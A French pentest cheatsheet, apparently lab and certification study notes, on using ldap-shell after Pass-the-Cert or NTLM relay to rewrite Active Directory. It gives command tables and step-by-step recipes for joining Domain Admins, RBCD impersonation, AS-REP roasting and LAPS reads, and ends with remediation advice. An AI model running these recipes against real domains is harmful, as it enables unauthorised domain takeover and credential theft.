# Cheatsheet — ldap-shell (Pass-the-Cert & relais LDAP)

Shell interactif qui parle **LDAP** à un contrôleur de domaine **avec les droits d'une identité déjà obtenue** (un certificat, un relais NTLM, un compte privilégié). On ne "pose" pas de commande Windows : on **modifie directement l'annuaire AD** (groupes, ACL, délégations, mots de passe). C'est l'étape qui transforme un accès en **compromission du domaine**.

**Rappel légal : uniquement sur tes labs et les périmètres autorisés par écrit (art. 323-1 du Code pénal).**

---

## 1. Comment on l'ouvre

Trois portes d'entrée, même shell derrière :

```bash
# A) Pass-the-Cert (certipy) — quand le PKINIT échoue (KDC_ERR_PADATA_TYPE_NOSUPP)
#    mais que le certificat est valable en TLS client sur LDAPS
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell

# B) passthecert.py (AlmondOffSec) — même idée, cert séparé en .crt + .key
python3 passthecert.py -action ldap-shell \
  -crt administrator.crt -key administrator.key \
  -domain <domaine> -dc-ip <DC_IP>

# C) Relais NTLM vers LDAP(S)
impacket-ntlmrelayx -t ldaps://<DC_IP> -i      # -i = shell interactif
#   puis on s'y connecte : nc 127.0.0.1 11000
```

> **Pourquoi Pass-the-Cert ?** Un certificat prouve l'identité de **2 façons** : Kerberos (PKINIT → hash NT) **ou** TLS client sur **LDAPS (Schannel)**. Si le KDC refuse le PKINIT, le canal LDAPS accepte quand même le cert → on agit en LDAP avec l'identité du certificat. (C'est la différence **Escape** = PKINIT OK vs **Authority** = PKINIT KO → `-ldap-shell`.)

---

## 2. Les commandes utiles (une fois dans le shell)

> Tape `help` dans le shell pour la liste exacte de ta version. Les plus rentables :

### Prise de contrôle directe
| Commande | Effet |
| --- | --- |
| `add_user_to_group <user> <group>` | **Le classique** : s'ajouter à `Domain Admins` / `Administrators` / `Remote Management Users` |
| `change_password <target> [newpass]` | Changer le mot de passe d'un compte (sans connaître l'ancien) |
| `grant_control <target> <grantee>` | Donner le **contrôle total** (WriteDacl) sur un objet à un principal qu'on contrôle |

### Délégations (mouvement latéral / impersonation)
| Commande | Effet |
| --- | --- |
| `set_rbcd <target> <grantee>` | Poser du **RBCD** : `grantee` (ton compte machine) pourra impersonner n'importe qui vers `target` |
| `clear_rbcd <target>` | Nettoyer le RBCD (remédiation / discrétion) |

### Comptes & objets
| Commande | Effet |
| --- | --- |
| `add_computer <name> [password]` | Créer un **compte machine** (utile pour RBCD / enrôlement ESC1) |
| `rename_computer <old> <new>` | Renommer un compte machine (ex. attaque sAMAccountName / noPac) |
| `add_user <new_user> [parent_OU]` | Créer un utilisateur |
| `disable_account <user>` / `enable_account <user>` | Désactiver / réactiver un compte |
| `set_dontreqpreauth <user> true` | Forcer "no preauth" sur un compte → le rendre **AS-REP roastable** |

### Lecture / repérage
| Commande | Effet |
| --- | --- |
| `dump` | Dump des objets de l'annuaire |
| `search <filtre> [attributs]` | Requête LDAP ciblée (ex. `search (objectclass=user) sAMAccountName`) |
| `get_user_groups <user>` | Groupes d'un utilisateur |
| `get_group_users <group>` | Membres d'un groupe |
| `get_laps_password <computer>` | Lire le **mot de passe LAPS** d'une machine (si on a le droit) |
| `write_gpo_dacl <user> <gpo>` | S'octroyer des droits d'écriture sur une **GPO** |
| `whoami` | Sous quelle identité j'agis |
| `exit` | Quitter |

---

## 3. Recettes prêtes à l'emploi

```text
# Devenir Domain Admin quand le cert = administrator (Authority)
add_user_to_group svc_ldap "Domain Admins"
# puis, hors du shell :
#   evil-winrm -i <DC_IP> -u svc_ldap -p '<pass>'
```

```text
# Chaîne RBCD complète (j'ai le contrôle d'un objet machine cible)
# 1) créer mon compte machine (ou le réutiliser)
add_computer ATTACK$ Password123!
# 2) autoriser ATTACK$ à déléguer vers la cible
set_rbcd DC01$ ATTACK$
# puis, hors du shell : getST S4U (impacket) pour un ticket cifs/DC01 en tant qu'administrator
```

```text
# Rendre un compte kerberoastable sans mot de passe (AS-REP)
set_dontreqpreauth juicy_user true
# puis : impacket-GetNPUsers / hashcat -m 18200
```

---

## 4. Après le ldap-shell : exploiter ce qu'on a posé

| Ce que j'ai fait dans le shell | Outil pour en profiter |
| --- | --- |
| `add_user_to_group` → DA | `evil-winrm` / `psexec` / `secretsdump` |
| `set_rbcd` | `impacket-getST -spn cifs/<cible> -impersonate administrator ...` → `KRB5CCNAME` → psexec `-k -no-pass` |
| `change_password admin` | connexion directe (⚠️ bruyant, casse le compte — à éviter en prod) |
| `get_laps_password` | mot de passe admin local → PtH / WinRM |

---

## 5. À savoir expliquer à l'oral

- **Ce n'est pas un shell système** : on ne lance pas de `.exe`, on **réécrit l'annuaire**. Un DC applique ces changements globalement → impact domaine entier.
- **Pass-the-Cert vs PKINIT** : deux usages du même certificat ; si l'un est bloqué (KDC), l'autre (LDAPS/Schannel) passe souvent.
- **RBCD en une phrase** : "j'autorise une machine que je contrôle à demander, au nom de n'importe quel utilisateur, un ticket de service vers une cible" → impersonation de l'admin sans son mot de passe.
- **Remédiation** : LDAP **signing + channel binding** (bloque le relais), surveiller les écritures sur `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) et les changements d'appartenance aux groupes privilégiés, restreindre le `MachineAccountQuota` à 0.

## Références
- Fiches liées : [ad-memo](ad-memo.md) · [impacket](impacket.md) · [bloodhound](bloodhound.md) · [smb](smb.md)
- Machines : [Authority](../machines/Authority.md) (Pass-the-Cert) · [Certified](../machines/Certified.md) (ACL→shadow creds) · [Escape](../machines/Escape.md) (ESC1 PKINIT)
